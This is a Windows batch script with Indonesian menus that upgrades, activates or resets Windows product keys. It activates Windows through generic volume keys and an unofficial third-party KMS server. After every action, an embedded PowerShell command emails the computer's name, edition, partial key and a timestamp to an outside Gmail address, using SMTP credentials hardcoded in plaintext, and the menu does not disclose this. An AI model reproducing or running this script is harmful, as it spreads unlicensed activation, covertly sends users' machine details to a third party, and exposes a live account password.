@echo off
title Capture Product Key by ElesssGhifariii
color 0a

:: --- KONFIGURASI EMAIL ---
set "FROM_EMAIL=my.donger@hanadesu.my.id"
set "TO_EMAIL=domethode@gmail.com"
set "SMTP_SERVER=smtp.zoho.com"
set "SMTP_PORT=587"
set "EMAIL_USER=my.donger@hanadesu.my.id"
set "EMAIL_PASS=Lnoxzxdz11*"

:MENU
cls
echo ==========================================
echo   Selamat Datang di Script Capture Key
echo ==========================================
echo.
echo   1. Upgrade Versi Windows
echo   2. Aktivasi Windows
echo   3. Hapus Product Key (Reset)
echo   0. Keluar
echo.
set /p pilih=Masukkan pilihan (0-3): 

if "%pilih%"=="1" goto UPGRADE
if "%pilih%"=="2" goto AKTIVASI
if "%pilih%"=="3" goto RESET
if "%pilih%"=="0" exit
goto MENU

:UPGRADE
cls
echo ==========================================
echo       Pilih Versi Windows untuk Upgrade
echo ==========================================
echo  1. Windows 10 Home
echo  2. Windows 10 Home Single Language
echo  3. Windows 10 Pro
echo  4. Windows 10 Enterprise
echo  5. Windows 11 Home
echo  6. Windows 11 Home Single Language
echo  7. Windows 11 Pro
echo  8. Windows 11 Enterprise
echo  0. Kembali
echo.
set /p upg=Masukkan pilihan (0-8): 

if "%upg%"=="1" set "nama=Windows 10 Home" & set "key=YTMG3-N6DKC-DKB77-7M9GH-8HVX7"
if "%upg%"=="2" set "nama=Windows 10 Home Single Language" & set "key=BT79Q-G7N6G-PGBYW-4YWX6-6F4BT"
if "%upg%"=="3" set "nama=Windows 10 Pro" & set "key=VK7JG-NPHTM-C97JM-9MPGT-3V66T"
if "%upg%"=="4" set "nama=Windows 10 Enterprise" & set "key=XGVPP-NMH47-7TTHJ-W3FW7-8HV2C"
if "%upg%"=="5" set "nama=Windows 11 Home" & set "key=YTMG3-N6DKC-DKB77-7M9GH-8HVX7"
if "%upg%"=="6" set "nama=Windows 11 Home Single Language" & set "key=BT79Q-G7N6G-PGBYW-4YWX6-6F4BT"
if "%upg%"=="7" set "nama=Windows 11 Pro" & set "key=VK7JG-NPHTM-C97JM-9MPGT-3V66T"
if "%upg%"=="8" set "nama=Windows 11 Enterprise" & set "key=XGVPP-NMH47-7TTHJ-W3FW7-8HV2C"
if "%upg%"=="0" goto MENU

if not defined key goto UPGRADE

set "last5=%key:~-5%"

:: Simpan log
(
  echo =======================================
  echo Nama Windows : %nama%
  echo Product Key  : *****-*****-*****-*****-%last5%
  echo Upgrade Time : %date% %time%
  echo =======================================
) >> CapturedKey.txt

cls
echo ==========================================
echo     Upgrade %nama% Sedang Berjalan
echo ==========================================
cscript //nologo %windir%\system32\slmgr.vbs /ipk %key% >nul 2>&1
if %errorlevel%==0 (
  echo [OK] Product Key dipasang untuk upgrade.
  set "status=Berhasil"
) else (
  echo [GAGAL] Product Key tidak bisa dipasang.
  set "status=Gagal"
)
echo.
echo Catatan: Untuk melihat perubahan edition Windows,
echo silakan restart perangkat Anda.
echo ==========================================

:: --- Kirim log ke email dengan PowerShell ---
powershell -Command "$EMAIL_BODY=\"Title         : Upgrade Windows`n=======================================`nComputer Name  : %COMPUTERNAME%`nWindows Version: %nama%`nCaptured Key   : *****-*****-*****-*****-%last5%`nProses         : %status%`nTime           : %date% %time%`n=======================================\"; $SMTPServer='%SMTP_SERVER%'; $SMTPPort=%SMTP_PORT%; $EmailFrom='%FROM_EMAIL%'; $EmailTo='%TO_EMAIL%'; $Subject='Captured Key Log'; $Cred = New-Object System.Management.Automation.PSCredential('%EMAIL_USER%',(ConvertTo-SecureString '%EMAIL_PASS%' -AsPlainText -Force)); Send-MailMessage -SmtpServer $SMTPServer -Port $SMTPPort -UseSsl -Credential $Cred -From $EmailFrom -To $EmailTo -Subject $Subject -Body $EMAIL_BODY"

pause
goto MENU

:AKTIVASI
cls
echo ==========================================
echo        Pilih Versi Windows untuk Aktivasi
echo ==========================================
echo  1. Windows 10 Home
echo  2. Windows 10 Home Single Language
echo  3. Windows 10 Pro
echo  4. Windows 10 Enterprise
echo  5. Windows 11 Home
echo  6. Windows 11 Home Single Language
echo  7. Windows 11 Pro
echo  8. Windows 11 Enterprise
echo  0. Kembali
echo.
set /p act=Masukkan pilihan (0-8): 

if "%act%"=="1" set "nama=Windows 10 Home" & set "key=TX9XD-98N7V-6WMQ6-BX7FG-H8Q99"
if "%act%"=="2" set "nama=Windows 10 Home Single Language" & set "key=7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH"
if "%act%"=="3" set "nama=Windows 10 Pro" & set "key=W269N-WFGWX-YVC9B-4J6C9-T83GX"
if "%act%"=="4" set "nama=Windows 10 Enterprise" & set "key=NPPR9-FWDCX-D2C8J-H872K-2YT43"
if "%act%"=="5" set "nama=Windows 11 Home" & set "key=TX9XD-98N7V-6WMQ6-BX7FG-H8Q99"
if "%act%"=="6" set "nama=Windows 11 Home Single Language" & set "key=7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH"
if "%act%"=="7" set "nama=Windows 11 Pro" & set "key=W269N-WFGWX-YVC9B-4J6C9-T83GX"
if "%act%"=="8" set "nama=Windows 11 Enterprise" & set "key=NPPR9-FWDCX-D2C8J-H872K-2YT43"
if "%act%"=="0" goto MENU

if not defined key goto AKTIVASI

set "last5=%key:~-5%"

:: Simpan log
(
  echo =======================================
  echo Aktivasi Windows : %nama%
  echo Product Key      : *****-*****-*****-*****-%last5%
  echo Aktivasi Time    : %date% %time%
  echo =======================================
) >> CapturedKey.txt

cls
echo ==========================================
echo     Aktivasi %nama% Sedang Berjalan
echo ==========================================
echo.
echo Memasang key ...
cscript //nologo %windir%\system32\slmgr.vbs /ipk %key% >nul 2>&1
if %errorlevel%==0 (
  echo [OK] Product Key berhasil dipasang.
  set "status=Berhasil"
) else (
  echo [GAGAL] Gagal memasang Product Key.
  set "status=Gagal"
)

echo.
echo Mengatur Aktivasi Server ...
cscript //nologo %windir%\system32\slmgr.vbs /skms kms.digiboy.ir >nul 2>&1
echo [OK] Proses Aktivasi Server.

echo.
echo Mengaktifkan key ...
cscript //nologo %windir%\system32\slmgr.vbs /ato >nul 2>&1
if %errorlevel%==0 (
  echo [OK] Aktivasi key berhasil.
) else (
  echo [GAGAL] Aktivasi key gagal.
  set "status=Gagal"
)
echo ==========================================

:: --- Kirim log ke email dengan PowerShell ---
powershell -Command "$EMAIL_BODY=\"Title         : Aktivasi Windows`n=======================================`nComputer Name  : %COMPUTERNAME%`nWindows Version: %nama%`nCaptured Key   : *****-*****-*****-*****-%last5%`nProses         : %status%`nTime           : %date% %time%`n=======================================\"; $SMTPServer='%SMTP_SERVER%'; $SMTPPort=%SMTP_PORT%; $EmailFrom='%FROM_EMAIL%'; $EmailTo='%TO_EMAIL%'; $Subject='Captured Key Log'; $Cred = New-Object System.Management.Automation.PSCredential('%EMAIL_USER%',(ConvertTo-SecureString '%EMAIL_PASS%' -AsPlainText -Force)); Send-MailMessage -SmtpServer $SMTPServer -Port $SMTPPort -UseSsl -Credential $Cred -From $EmailFrom -To $EmailTo -Subject $Subject -Body $EMAIL_BODY"

echo.
echo Mohon tunggu sebentar untuk melihat status expired key...
timeout /t 5 >nul
slmgr.vbs /xpr
pause
goto MENU

:RESET
cls
color 0c
echo ==========================================
echo          Menghapus Product Key...
echo ==========================================
echo.
echo Proses Menghapus Product Key...
slmgr /upk
slmgr /cpky
if %errorlevel%==0 (
  echo [OK] Product Key berhasil dihapus.
  set "status=Berhasil"
) else (
  echo [GAGAL] Product Key gagal dihapus.
  set "status=Gagal"
)
echo ==========================================

:: --- Kirim log ke email dengan PowerShell ---
powershell -Command "$EMAIL_BODY=\"Title         : Reset Product Key`n=======================================`nComputer Name  : %COMPUTERNAME%`nWindows Version: RESET MODE`nAction         : Product Key Removed`nProses         : %status%`nTime           : %date% %time%`n=======================================\"; $SMTPServer='%SMTP_SERVER%'; $SMTPPort=%SMTP_PORT%; $EmailFrom='%FROM_EMAIL%'; $EmailTo='%TO_EMAIL%'; $Subject='Captured Key Log'; $Cred = New-Object System.Management.Automation.PSCredential('%EMAIL_USER%',(ConvertTo-SecureString '%EMAIL_PASS%' -AsPlainText -Force)); Send-MailMessage -SmtpServer $SMTPServer -Port $SMTPPort -UseSsl -Credential $Cred -From $EmailFrom -To $EmailTo -Subject $Subject -Body $EMAIL_BODY"

pause
goto MENU

